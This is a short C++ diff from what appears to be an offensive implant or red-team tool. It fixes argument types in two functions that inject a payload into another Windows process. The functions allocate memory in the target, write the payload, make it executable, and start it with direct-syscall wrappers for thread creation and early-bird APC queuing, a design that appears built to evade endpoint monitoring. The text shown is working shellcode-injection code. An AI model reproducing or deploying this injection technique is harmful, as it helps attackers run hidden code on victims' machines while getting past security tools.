@@ -229,13 +229,14 @@ std::string static inline inject(int pid, const std::string& payload, bool useSy
 
 			Sw3NtAllocateVirtualMemory_(processHandle, &remoteBuffer, 0, &sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-			Sw3NtWriteVirtualMemory_(processHandle, remoteBuffer, (PVOID)payload.data(), payload.size(), 0);
+			SIZE_T NumberOfBytesWritten;
+			Sw3NtWriteVirtualMemory_(processHandle, remoteBuffer, (PVOID)payload.data(), payload.size(), &NumberOfBytesWritten);
 			
 			ULONG oldAccess;
 			Sw3NtProtectVirtualMemory_(processHandle, &remoteBuffer, &sizeToAlloc, PAGE_EXECUTE_READ, &oldAccess);
 
 			HANDLE hThread;
-			Sw3NtCreateThreadEx_(&hThread, 0x1FFFFF, NULL, processHandle, (void*) remoteBuffer, NULL, FALSE, 0, 0, 0, NULL);
+			Sw3NtCreateThreadEx_(&hThread, 0x1FFFFF, (POBJECT_ATTRIBUTES)NULL, processHandle, (void*) remoteBuffer, (PVOID)NULL, FALSE, 0, 0, 0, (PPS_ATTRIBUTE_LIST)NULL);
 
 			Sw3NtClose_(hThread);
 			Sw3NtClose_(processHandle);
@@ -352,13 +353,15 @@ std::string static inline spawnInject(const std::string& payload, const std::str
 
 			Sw3NtAllocateVirtualMemory_(piProcInfo.hProcess, &remoteBuffer, 0, &sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-			Sw3NtWriteVirtualMemory_(piProcInfo.hProcess, remoteBuffer, (PVOID)payload.data(), payload.size(), 0);
+			SIZE_T NumberOfBytesWritten;
+			Sw3NtWriteVirtualMemory_(piProcInfo.hProcess, remoteBuffer, (PVOID)payload.data(), payload.size(), &NumberOfBytesWritten);
 			
 			ULONG oldAccess;
 			Sw3NtProtectVirtualMemory_(piProcInfo.hProcess, &remoteBuffer, &sizeToAlloc, PAGE_EXECUTE_READ, &oldAccess);
 
-			Sw3NtQueueApcThread_(piProcInfo.hThread, (PIO_APC_ROUTINE)remoteBuffer, remoteBuffer, NULL, NULL);
-			Sw3NtResumeThread_(piProcInfo.hThread, NULL);
+			Sw3NtQueueApcThread_(piProcInfo.hThread, (PIO_APC_ROUTINE)remoteBuffer, remoteBuffer, (PIO_STATUS_BLOCK)NULL, NULL);
+			Sw3NtResumeThread_(piProcInfo.hThread, (PULONG)NULL);
+
 			result += "Process injected.";
 		}
 		else
